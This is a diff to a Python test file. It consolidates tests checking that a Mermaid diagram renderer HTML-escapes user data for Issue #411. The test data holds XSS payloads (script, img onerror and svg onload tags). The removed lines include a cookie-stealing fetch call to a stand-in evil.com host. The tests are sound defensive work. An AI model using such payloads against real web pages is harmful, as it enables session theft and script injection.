@@ -289,21 +289,13 @@ def test_write_pretty_architecture_json(tmp_path):
 # --- Tests for XSS Prevention (Issue #411) ---
 
 def extract_module_data_json(html_doc):
-    """
-    Extract the moduleData JSON from the generated HTML.
-
-    This function properly handles JSON embedded in HTML, which may contain
-    HTML entities like &lt; and &gt; that include semicolons. The naive
-    approach of split(';')[0] fails when HTML entities are present.
-    """
+    """Extract the moduleData JSON from the generated HTML."""
     start_marker = 'const moduleData = '
     start = html_doc.find(start_marker)
     if start == -1:
         raise ValueError("Could not find 'const moduleData = ' in HTML")
 
     start += len(start_marker)
-
-    # Parse the JSON by counting braces, respecting string boundaries
     brace_count = 0
     in_string = False
     escape_next = False
@@ -333,27 +325,20 @@ def extract_module_data_json(html_doc):
     raise ValueError("Could not find end of JSON object")
 
 
-class TestXSSPrevention:
+class TestXSSPreventionIssue411:
     """
-    Test suite for XSS vulnerability prevention in Mermaid diagram tooltips.
+    Comprehensive XSS vulnerability prevention tests for Issue #411.
 
-    These tests verify that user-controlled data from architecture.json is properly
-    HTML-escaped before being embedded in the generated HTML. The vulnerability exists
-    at lines 120-127 in pdd/render_mermaid.py where user data is copied without
-    HTML escaping before being embedded in JSON that will be rendered via innerHTML.
-
-    All tests should FAIL with the current vulnerable code and PASS after applying
-    html.escape() to all user-controlled fields.
+    Tests verify that user data from architecture.json is properly escaped
+    to prevent XSS attacks in both tooltips and Mermaid diagrams.
     """
 
-    def test_xss_prevention_in_all_tooltip_fields(self):
+    def test_comprehensive_tooltip_xss_prevention(self):
         """
-        Test 1: Verify all tooltip fields properly escape HTML special characters.
+        Comprehensive test: Verify all tooltip fields escape XSS payloads.
 
-        This is the primary test that covers all 6 vulnerable fields identified in
-        the root cause analysis: filename, description, tags, dependencies, filepath,
-        and priority. Each field receives an XSS payload, and we verify that HTML
-        entities are used instead of raw HTML characters.
+        Tests all 6 vulnerable fields (filename, description, tags, dependencies,
+        filepath, priority) with various XSS attack vectors.
         """
         arch = [{
             "filename": "test<img src=x onerror=alert('XSS')>.py",
@@ -365,197 +350,74 @@ class TestXSSPrevention:
         }]
 
         html_doc = generate_html("", arch, "Test App")
-
-        # Extract the JSON from the generated HTML
         json_str = extract_module_data_json(html_doc)
 
-        # Verify HTML special characters are escaped in the JSON string
-        # After fix: should contain &lt; &gt; instead of < >
-        # Before fix: contains raw < > characters, creating XSS vulnerability
+        # Verify HTML special characters are escaped (as HTML entities or Unicode)
         assert '&lt;img' in json_str or '\\u003c' in json_str, \
-            "filename field: < character should be escaped (as &lt; or \\u003c)"
+            "< character should be escaped"
         assert '&lt;script&gt;' in json_str or '\\u003cscript\\u003e' in json_str, \
-            "description field: <script> tags should be escaped"
+            "<script> tags should be escaped"
         assert '&lt;svg' in json_str or '\\u003csvg' in json_str, \
-            "filepath field: <svg tag should be escaped"
-        assert '&lt;High&gt;' in json_str or '\\u003cHigh\\u003e' in json_str, \
-            "priority field: < > should be escaped"
+            "<svg tag should be escaped"
 
-        # Verify that unescaped XSS payloads are NOT present
+        # Verify unescaped XSS payloads are NOT present
         assert '<img src=x onerror=' not in json_str, \
-            "Raw XSS payload should not be present in JSON"
+            "Raw XSS payload should not be present"
         assert '<script>alert(' not in json_str, \
-            "Unescaped script tags should not be present in JSON"
+            "Unescaped script tags should not be present"
 
-    def test_xss_in_filename_field(self):
+    def test_comprehensive_mermaid_diagram_xss_prevention(self):
         """
-        Test 2: XSS prevention in filename field.
+        Comprehensive test: Verify all Mermaid diagram locations escape XSS.
 
-        Verifies that malicious HTML/JavaScript in the filename is properly escaped.
-        """
-        arch = [{
-            "filename": "test<img src=x onerror=alert('XSS-filename')>.py",
-        }]
-
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
-
-        # After fix: should be escaped
-        assert '&lt;img' in json_str or '\\u003cimg' in json_str, \
-            "filename: <img tag should be HTML-escaped"
-        # Before fix: unescaped payload is present
-        assert '<img src=x onerror=' not in json_str, \
-            "filename: unescaped XSS payload should not be present"
-
-    def test_xss_in_description_field(self):
-        """
-        Test 3: XSS prevention in description field.
-
-        Verifies that malicious script tags in description are properly escaped.
-        """
-        arch = [{
-            "filename": "safe.py",
-            "description": "Normal text<script>alert('XSS-description')</script>more text",
-        }]
-
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
-
-        # After fix: should contain escaped HTML entities
-        assert '&lt;script&gt;' in json_str or '\\u003cscript\\u003e' in json_str, \
-            "description: <script> tags should be HTML-escaped"
-        # Before fix: unescaped script tags present
-        assert '<script>alert(' not in json_str, \
-            "description: unescaped script tags should not be present"
-
-    def test_xss_in_tags_array(self):
-        """
-        Test 4: XSS prevention in tags array.
-
-        Verifies that malicious HTML in tags array elements is properly escaped.
-        Tags are arrays that get joined with commas in the tooltip rendering.
-        """
-        arch = [{
-            "filename": "api.py",
-            "tags": ["api", "<img src=x onerror=fetch('https://evil.com')>", "backend"],
-        }]
-
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
-        data = json.loads(json_str)
-
-        # After fix: malicious tag should be escaped in the JSON (either HTML entities or Unicode escapes)
-        # The JSON source should contain escaped form to prevent literal XSS code in HTML
-        assert '&lt;img' in json_str or '\\u003cimg' in json_str, \
-            "tags: malicious tag elements should be HTML-escaped or Unicode-escaped in JSON source"
-
-        # Note: After JSON parsing, Unicode escapes become original characters
-        # This is safe because render_mermaid.py uses textContent (not innerHTML) for dynamic content
-        # The parsed malicious_tag will contain '<img', but it won't execute as XSS
-
-    def test_xss_in_dependencies_array(self):
-        """
-        Test 5: XSS prevention in dependencies array.
-
-        Verifies that malicious HTML in dependencies array is properly escaped.
-        """
-        arch = [{
-            "filename": "main.py",
-            "dependencies": ["utils<script>alert('XSS-deps')</script>", "helpers"],
-        }]
-
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
-
-        # After fix: should be escaped
-        assert '&lt;script&gt;' in json_str or '\\u003cscript\\u003e' in json_str, \
-            "dependencies: <script> tags should be HTML-escaped"
-        # Before fix: unescaped
-        assert '<script>alert(' not in json_str, \
-            "dependencies: unescaped script tags should not be present"
-
-    def test_xss_in_filepath_field(self):
-        """
-        Test 6: XSS prevention in filepath field.
-
-        Verifies that malicious SVG/HTML in filepath is properly escaped.
-        """
-        arch = [{
-            "filename": "test.py",
-            "filepath": "/src/components/test<svg/onload=alert('XSS-filepath')>.py",
-        }]
-
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
-
-        # After fix: should be escaped
-        assert '&lt;svg' in json_str or '\\u003csvg' in json_str, \
-            "filepath: <svg tag should be HTML-escaped"
-        # Before fix: unescaped
-        assert '<svg/onload=' not in json_str, \
-            "filepath: unescaped SVG XSS should not be present"
-
-    def test_xss_multiple_vectors_simultaneously(self):
-        """
-        Test 7: Multiple XSS vectors across different modules.
-
-        Verifies that when multiple modules each have different XSS payloads,
-        all are properly escaped.
+        Tests XSS prevention in node definitions, labels, dependencies,
+        class assignments, priority field, and app name.
         """
         arch = [
             {
-                "filename": "module1<script>alert(1)</script>.py",
-                "description": "First module",
+                "filename": "xss1<img src=x onerror=alert(1)>.py",
+                "tags": ["frontend"],
+                "priority": "high<script>alert('pri')</script>",
+                "dependencies": ["xss2<script>alert(2)</script>.py"],
             },
             {
-                "filename": "module2.py",
-                "description": "Second<img src=x onerror=alert(2)>",
-            },
-            {
-                "filename": "module3.py",
-                "tags": ["<svg onload=alert(3)>"],
-            },
+                "filename": "xss2<script>alert(2)</script>.py",
+                "tags": ["backend"],
+                "priority": 2,
+            }
         ]
 
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
+        mermaid_code = generate_mermaid_code(arch, "XSS<svg onload=alert(3)> Test")
 
-        # After fix: all should be escaped
-        assert '<script>alert(1)' not in json_str, \
-            "module1 XSS should be escaped"
-        assert '<img src=x onerror=alert(2)' not in json_str, \
-            "module2 XSS should be escaped"
-        assert '<svg onload=alert(3)' not in json_str, \
-            "module3 XSS should be escaped"
+        # Verify NO unescaped XSS payloads in entire Mermaid code
+        assert '<img src=x onerror=' not in mermaid_code, "XSS payload 1 should be escaped"
+        assert '<script>alert(' not in mermaid_code, "XSS payloads 2 should be escaped"
+        assert '<svg onload=' not in mermaid_code, "XSS payload 3 should be escaped"
 
-    def test_xss_priority_field_edge_case(self):
+    def test_regression_priority_values(self):
         """
-        Test 8: XSS prevention in priority field with special characters.
+        Regression test: Numeric, string, and default priority values work correctly.
 
-        Priority can be a number or string. Test that string priority values
-        with HTML are properly escaped.
+        Ensures XSS fix doesn't break normal priority field behavior.
         """
-        arch = [{
-            "filename": "test.py",
-            "priority": "<High>",
-        }]
+        arch = [
+            {"filename": "high.py", "priority": 1},
+            {"filename": "medium.py", "priority": "medium"},
+            {"filename": "default.py"},  # No priority - should default to 0
+        ]
 
-        html_doc = generate_html("", arch, "Test App")
-        json_str = extract_module_data_json(html_doc)
+        mermaid_code = generate_mermaid_code(arch, "Test App")
 
-        # After fix: should be escaped
-        assert '&lt;High&gt;' in json_str or '\\u003cHigh\\u003e' in json_str, \
-            "priority: < > characters should be HTML-escaped"
-        # Before fix: unescaped
-        assert '"priority": "<High>"' not in json_str, \
-            "priority: unescaped < > should not be present"
+        # All priority values should appear correctly
+        assert 'high["high (1)"]' in mermaid_code
+        assert 'medium["medium (medium)"]' in mermaid_code
+        assert 'default["default (0)"]' in mermaid_code
 
     def test_regression_legitimate_special_characters(self):
         """
-        Test 9: Regression test - ensure legitimate characters still work.
+        Regression test: Ensure legitimate special characters still work.
 
-        Verifies that the fix doesn't break legitimate use of special characters
-        like quotes, apostrophes, and Unicode.
+        Verifies XSS fix doesn't break quotes, apostrophes, and Unicode.
         """
         arch = [{
             "filename": "user's_file.py",
@@ -566,28 +428,22 @@ class TestXSSPrevention:
 
         html_doc = generate_html("", arch, "Test App")
         json_str = extract_module_data_json(html_doc)
-
-        # Should be valid JSON
         data = json.loads(json_str)
 
-        # Data should be preserved correctly (JSON handles quotes/apostrophes)
-        assert "user's_file" in data or "user\'s_file" in str(data)
+        # Data should be preserved correctly
+        assert "user's_file" in data or "user\\'s_file" in str(data)
         assert '"quoted"' in data["user's_file"]["description"] or \
                '"quoted"' in str(data["user's_file"]["description"])
         assert data["user's_file"]["priority"] == 1
 
-    def test_empty_and_default_values_escaping(self):
+    def test_edge_case_empty_values(self):
         """
-        Test 10: XSS prevention with empty values and defaults.
+        Edge case test: Empty strings and missing fields handled gracefully.
 
-        Verifies that default values like "N/A" and "No description" are safe,
-        and empty arrays/strings don't cause issues with escaping.
+        Ensures XSS fix works with defaults and empty values.
         """
         arch = [
-            {
-                "filename": "minimal.py",
-                # Missing optional fields - will use defaults
-            },
+            {"filename": "minimal.py"},  # Missing optional fields
             {
                 "filename": "empty<script>.py",
                 "description": "",
@@ -605,471 +461,5 @@ class TestXSSPrevention:
         assert data["minimal"]["priority"] == "N/A"
         assert data["minimal"]["description"] == "No description"
 
-        # Verify empty filename still gets escaped
-        assert '<script>' not in json_str, \
-            "XSS in filename should be escaped even with empty other fields"
-
-
-# --- Tests for XSS Prevention in Mermaid Diagram Code (Issue #411 - Cycle 1) ---
-class TestXSSPreventionMermaidCode:
-    """
-    Test suite for XSS vulnerability prevention in the Mermaid diagram code itself.
-
-    These tests were added in Cycle 1 of the fix workflow after Step 1 fixed XSS in
-    the tooltip JSON data (generate_html function), but E2E tests revealed that the
-    generate_mermaid_code function STILL embeds unescaped user data directly in the
-    Mermaid diagram syntax within <pre class="mermaid"> tags.
-
-    Vulnerable locations in generate_mermaid_code():
-    - Line 68: name = Path(m['filename']).stem (unescaped)
-    - Line 70: Embeds unescaped name in Mermaid node definition
-    - Lines 86-89: Dependencies used unescaped in connections
-    - Lines 103-107: Filenames used unescaped in CSS class assignments
-
-    All tests should FAIL with the current vulnerable code and PASS after applying
-    HTML escaping to user-controlled data in the Mermaid diagram generation.
-    """
-
-    def test_xss_in_mermaid_node_definition(self):
-        """
-        Test that XSS payloads in filenames are escaped in Mermaid node definitions.
-
-        The generate_mermaid_code function creates nodes like:
-        modulename["modulename (priority)"]
-
-        If modulename contains < or >, it creates XSS when rendered in HTML.
-        """
-        arch = [{
-            "filename": "test<img src=x onerror=alert('XSS')>.py",
-            "priority": 1,
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # After fix: should contain escaped HTML entities
-        assert '&lt;img' in mermaid_code or '<img' not in mermaid_code, \
-            "Node name should be HTML-escaped in Mermaid code"
-
-        # Before fix: contains unescaped XSS payload
-        assert '<img src=x onerror=' not in mermaid_code, \
-            "Unescaped XSS payload should not be in Mermaid code"
-
-    def test_xss_in_mermaid_node_label(self):
-        """
-        Test that XSS in the node label (inside quotes) is escaped.
-
-        Mermaid syntax: nodeid["label text (priority)"]
-        If label contains HTML, it executes when rendered.
-        """
-        arch = [{
-            "filename": "safe<script>alert('XSS')</script>.py",
-            "priority": 2,
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # The label should not contain unescaped script tags
-        assert '<script>alert(' not in mermaid_code, \
-            "Script tags should not appear unescaped in node labels"
-
-        # After fix: should be escaped or sanitized
-        assert '&lt;script&gt;' in mermaid_code or '<script>' not in mermaid_code, \
-            "HTML should be escaped in node labels"
-
-    def test_xss_in_dependency_connections(self):
-        """
-        Test that XSS in dependencies is escaped in Mermaid connection syntax.
-
-        Lines 86-89 create connections like: src -->|uses| dst
-        Both src and dst are derived from filenames without escaping.
-        """
-        arch = [
-            {
-                "filename": "main.py",
-                "dependencies": ["evil<img src=x onerror=alert(1)>.py"],
-            },
-            {
-                "filename": "evil<img src=x onerror=alert(1)>.py",
-            }
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Dependencies should not contain unescaped XSS
-        assert '<img src=x onerror=' not in mermaid_code, \
-            "Dependencies should be HTML-escaped in connection syntax"
-
-    def test_xss_in_css_class_assignments(self):
-        """
-        Test that XSS in filenames is escaped in CSS class assignment syntax.
-
-        Lines 103-107 create class assignments like:
-        class module1,module2,module3 frontend
-
-        Module names are extracted from filenames without escaping.
-        """
-        arch = [
-            {
-                "filename": "ui<svg onload=alert(1)>.js",
-                "tags": ["frontend"],
-            },
-            {
-                "filename": "component<script>xss</script>.jsx",
-                "tags": ["frontend"],
-            }
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Class assignments should not contain unescaped HTML
-        assert '<svg onload=' not in mermaid_code, \
-            "SVG XSS should not appear in class assignments"
-        assert '<script>' not in mermaid_code, \
-            "Script tags should not appear in class assignments"
-
-    def test_xss_in_subgraph_module_names(self):
-        """
-        Test that XSS payloads in module names within subgraphs are escaped.
-
-        Lines 67-71 generate subgraph content with module nodes.
-        Each module name is derived from filename without escaping.
-        """
-        arch = [
-            {
-                "filename": "frontend<img src=x onerror=alert('fe')>.jsx",
-                "tags": ["frontend"],
-                "priority": 1,
-            },
-            {
-                "filename": "backend<img src=x onerror=alert('be')>.py",
-                "tags": ["backend"],
-                "priority": 2,
-            }
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Count occurrences - XSS payload appears in: node id, node label, class assignment
-        xss_count = mermaid_code.count('<img src=x onerror=')
-
-        # Before fix: XSS appears multiple times (unescaped)
-        # After fix: XSS should be escaped (0 occurrences or escaped entities)
-        assert xss_count == 0, \
-            f"Unescaped XSS payload found {xss_count} times in Mermaid code"
-
-    def test_xss_in_app_name_mermaid_label(self):
-        """
-        Test that XSS in app_name is escaped in the PRD node label.
-
-        Line 44 creates: PRD["app_name"]
-        The app_name is partially escaped (quotes -> &quot;) but < > are not.
-        """
-        app_name = "My App<script>alert('xss')</script>"
-        arch = []
-
-        mermaid_code = generate_mermaid_code(arch, app_name)
-
-        # App name should not contain unescaped script tags
-        assert '<script>alert(' not in mermaid_code, \
-            "App name should be HTML-escaped in PRD node label"
-
-    def test_multiple_xss_vectors_in_mermaid(self):
-        """
-        Test that multiple XSS vectors across the Mermaid code are all escaped.
-
-        This comprehensive test verifies that ALL locations where user data
-        appears in the Mermaid code are properly escaped.
-        """
-        arch = [
-            {
-                "filename": "xss1<img src=x onerror=alert(1)>.py",
-                "tags": ["frontend"],
-                "priority": 1,
-                "dependencies": ["xss2<script>alert(2)</script>.py"],
-            },
-            {
-                "filename": "xss2<script>alert(2)</script>.py",
-                "tags": ["backend"],
-                "priority": 2,
-            }
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "XSS<svg onload=alert(3)> Test")
-
-        # Verify NO unescaped XSS payloads in the entire Mermaid code
-        assert '<img src=x onerror=' not in mermaid_code, \
-            "XSS payload 1 should be escaped"
-        assert '<script>alert(' not in mermaid_code, \
-            "XSS payload 2 should be escaped"
-        assert '<svg onload=' not in mermaid_code, \
-            "XSS payload 3 should be escaped"
-
-    def test_edge_case_special_mermaid_syntax_chars(self):
-        """
-        Test that special Mermaid syntax characters don't break the diagram.
-
-        Mermaid uses [], {}, (), -->, etc. Filenames with these could break syntax.
-        After escaping for HTML, ensure Mermaid syntax remains valid.
-        """
-        arch = [{
-            "filename": "module[with]brackets.py",
-            "priority": 1,
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Should still generate valid Mermaid code
-        assert 'flowchart TB' in mermaid_code
-        # Module name should appear (possibly escaped)
-        assert 'module' in mermaid_code or '&' in mermaid_code
-
-    def test_dependency_with_path_extraction(self):
-        """
-        Test that dependency paths are correctly extracted and escaped.
-
-        Line 88: dst = Path(dep).stem
-        Dependencies can have full paths, and the stem extraction might not
-        match the module ID if escaping is applied inconsistently.
-        """
-        arch = [
-            {
-                "filename": "src/main<xss>.py",
-                "dependencies": ["src/utils<xss>.py"],
-            },
-            {
-                "filename": "src/utils<xss>.py",
-            }
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Should not contain unescaped XSS
-        assert '<xss>' not in mermaid_code or '&lt;xss&gt;' in mermaid_code, \
-            "Path stems should be HTML-escaped consistently"
-
-    def test_empty_architecture_no_xss_injection(self):
-        """
-        Test that even with empty architecture, app_name XSS is prevented.
-
-        This is a boundary case to ensure XSS escaping works even when
-        architecture list is empty.
-        """
-        arch = []
-        app_name = "Empty<script>alert('xss')</script>App"
-
-        mermaid_code = generate_mermaid_code(arch, app_name)
-
-        # App name should be escaped
-        assert '<script>' not in mermaid_code, \
-            "App name XSS should be escaped even with empty architecture"
-
-
-# --- Tests for XSS Prevention in Mermaid Diagram Code (Issue #411 - Cycle 2) ---
-class TestMermaidDiagramXSSPrevention:
-    """
-    Test suite for XSS vulnerability prevention in Mermaid diagram flowchart code (Cycle 2).
-
-    Cycle 1 fixed the tooltip JSON data escaping (lines 120-127 with escape_html helper).
-    Cycle 2 addresses the second XSS vector: the Mermaid diagram code itself.
-
-    The vulnerability exists at line 69-70 in pdd/render_mermaid.py where the priority
-    field is embedded in Mermaid node labels without HTML escaping:
-        pri = m.get('priority', 0)  # Line 69 - NOT escaped
-        lines.append(f'{INDENT * LEVELS["node"]}{name}["{name} ({pri})"]')  # Line 70
-
-    When Mermaid.js renders this code in the browser, unescaped HTML/JavaScript executes.
-
-    All tests should FAIL with the current vulnerable code and PASS after escaping
-    the priority field at line 69.
-    """
-
-    def test_priority_xss_in_mermaid_node_label(self):
-        """
-        Test 1: Verify priority field is HTML-escaped in Mermaid node labels.
-
-        The priority field appears in Mermaid diagram node labels like:
-            modulename["modulename (priority)"]
-
-        If priority contains XSS payloads, they execute when Mermaid.js renders the diagram.
-        """
-        arch = [{
-            "filename": "test.py",
-            "priority": "high<img src=x onerror=alert('XSS-priority')>",
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Verify HTML special characters are escaped in Mermaid code
-        assert '&lt;img' in mermaid_code or '<img' not in mermaid_code, \
-            "priority field: XSS payload should be HTML-escaped in Mermaid node label"
-
-        # Verify unescaped XSS payload is NOT present
-        assert '<img src=x onerror=' not in mermaid_code, \
-            "Unescaped XSS payload should not appear in Mermaid diagram code"
-
-    def test_priority_script_tag_injection(self):
-        """
-        Test 2: Verify <script> tags in priority field are escaped.
-
-        Classic XSS attack using <script> tags in priority value.
-        """
-        arch = [{
-            "filename": "api.py",
-            "priority": "<script>alert('XSS')</script>",
-            "tags": ["backend"],
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Should not contain unescaped script tags
-        assert '<script>alert(' not in mermaid_code, \
-            "Unescaped <script> tags should not appear in Mermaid code"
-
-        # Should be escaped
-        assert '&lt;script&gt;' in mermaid_code or '<script>' not in mermaid_code
-
-    def test_priority_svg_xss_injection(self):
-        """
-        Test 3: Verify SVG-based XSS in priority field is escaped.
-
-        SVG tags with onload events are another common XSS vector.
-        """
-        arch = [{
-            "filename": "service.py",
-            "priority": "critical<svg/onload=alert('XSS')>",
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Should not contain unescaped SVG XSS
-        assert '<svg/onload=' not in mermaid_code and '<svg onload=' not in mermaid_code, \
-            "SVG XSS payload should not appear unescaped"
-
-        # Check for proper escaping
-        assert '&lt;svg' in mermaid_code or '<svg' not in mermaid_code
-
-    def test_priority_data_exfiltration_payload(self):
-        """
-        Test 4: Verify data exfiltration attacks via priority field are prevented.
-
-        Attack scenario: Attacker uses fetch() to steal cookies/tokens when diagram renders.
-        """
-        arch = [{
-            "filename": "auth.py",
-            "priority": "high<img src=x onerror=\"fetch('https://evil.com?data='+document.cookie)\">",
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Critical: fetch() call should NOT be present in executable form
-        assert "fetch('https://evil.com" not in mermaid_code, \
-            "Data exfiltration payload should be escaped"
-
-    def test_priority_xss_across_multiple_modules(self):
-        """
-        Test 5: Verify XSS escaping works for priority fields across all modules.
-
-        Tests that the fix is applied consistently to all modules in the architecture.
-        """
-        arch = [
-            {"filename": "module1.py", "priority": "<script>alert(1)</script>", "tags": ["frontend"]},
-            {"filename": "module2.py", "priority": "medium<img src=x onerror=alert(2)>", "tags": ["backend"]},
-            {"filename": "module3.py", "priority": "low<svg onload=alert(3)>"},
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # None of the XSS payloads should be present unescaped
-        assert '<script>alert(1)' not in mermaid_code
-        assert '<img src=x onerror=alert(2)' not in mermaid_code
-        assert '<svg onload=alert(3)' not in mermaid_code
-
-    def test_priority_edge_case_angle_brackets(self):
-        """
-        Test 6: Verify simple angle brackets in priority are escaped.
-
-        Even simple HTML-like syntax should be escaped to prevent interpretation.
-        """
-        arch = [{
-            "filename": "test.py",
-            "priority": "<High>",
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Angle brackets should be escaped
-        assert '&lt;High&gt;' in mermaid_code or '"test (<High>)"' not in mermaid_code, \
-            "Angle brackets in priority should be HTML-escaped"
-
-    def test_priority_numeric_values_unchanged(self):
-        """
-        Test 7: Verify numeric priority values work correctly after fix.
-
-        Regression test: ensure the fix doesn't break normal numeric priorities.
-        """
-        arch = [
-            {"filename": "high_pri.py", "priority": 1},
-            {"filename": "med_pri.py", "priority": 5},
-            {"filename": "low_pri.py", "priority": 10},
-        ]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Numeric priorities should appear correctly in node labels
-        assert 'high_pri["high_pri (1)"]' in mermaid_code
-        assert 'med_pri["med_pri (5)"]' in mermaid_code
-        assert 'low_pri["low_pri (10)"]' in mermaid_code
-
-    def test_priority_string_values_safe(self):
-        """
-        Test 8: Verify safe string priority values work correctly.
-
-        Regression test: ensure legitimate string priorities (without XSS) still work.
-        """
-        arch = [{
-            "filename": "api.py",
-            "priority": "high",
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Safe string should appear in node label
-        assert 'api["api (high)"]' in mermaid_code
-
-    def test_priority_default_value_when_missing(self):
-        """
-        Test 9: Verify default priority value (0) works when field is missing.
-
-        Ensures the fix handles missing priority fields correctly.
-        """
-        arch = [{
-            "filename": "no_priority.py",
-            # No priority field
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Default priority 0 should appear
-        assert 'no_priority["no_priority (0)"]' in mermaid_code
-
-    def test_priority_xss_combined_with_filename_escaping(self):
-        """
-        Test 10: Verify both filename and priority escaping work together.
-
-        Integration test: ensures both the filename (line 68) and priority (line 69)
-        escaping work correctly in the same module.
-        """
-        arch = [{
-            "filename": "test<xss>.py",
-            "priority": "high<script>alert('xss')</script>",
-        }]
-
-        mermaid_code = generate_mermaid_code(arch, "Test App")
-
-        # Both filename and priority should be escaped
-        # Filename escaping (line 68) already works
-        assert '<xss>' not in mermaid_code or '&lt;xss&gt;' in mermaid_code
-        # Priority escaping (line 69) needs to be fixed
-        assert '<script>alert(' not in mermaid_code
-
-
+        # Verify XSS still escaped with empty fields
+        assert '<script>' not in json_str
